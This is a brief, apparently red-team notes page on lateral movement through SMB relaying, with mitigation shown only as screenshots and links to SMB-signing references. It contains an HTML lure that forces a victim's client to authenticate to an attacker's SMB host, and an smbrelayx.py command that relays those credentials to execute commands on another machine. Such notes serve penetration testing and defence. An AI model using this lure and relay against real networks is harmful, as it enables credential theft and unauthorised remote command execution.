# Lateral Movement via SMB Relaying

{% hint style="warning" %}
WIP
{% endhint %}

## Execution

{% code-tabs %}
{% code-tabs-item title="message.html" %}
```markup
<html>
    <h1>holla good sir</h1>
    <img src="file://10.0.0.5/download.jpg">
</html>
```
{% endcode-tabs-item %}
{% endcode-tabs %}

{% code-tabs %}
{% code-tabs-item title="attacker@kali" %}
```text
smbrelayx.py -h 10.0.0.6 -c "ipconfig"
```
{% endcode-tabs-item %}
{% endcode-tabs %}

![](../.gitbook/assets/screenshot-from-2018-12-30-22-33-59.png)

![](../.gitbook/assets/peek-2018-12-30-22-31.gif)

## Mitigation

![](../.gitbook/assets/screenshot-from-2018-12-30-22-56-39.png)

![](../.gitbook/assets/screenshot-from-2018-12-30-22-36-01.png)

## References

{% embed url="https://ramnathshenoy.wordpress.com/2017/03/19/lateral-movement-with-smbrelayx-py/" %}

{% embed url="https://blogs.technet.microsoft.com/josebda/2010/12/01/the-basics-of-smb-signing-covering-both-smb1-and-smb2/" %}

{% embed url="https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2003/cc785861\(v=ws.10\)" %}

{% embed url="https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2003/cc728025\(v=ws.10\)" %}

{% embed url="https://nmap.org/nsedoc/scripts/smb-security-mode.html" %}



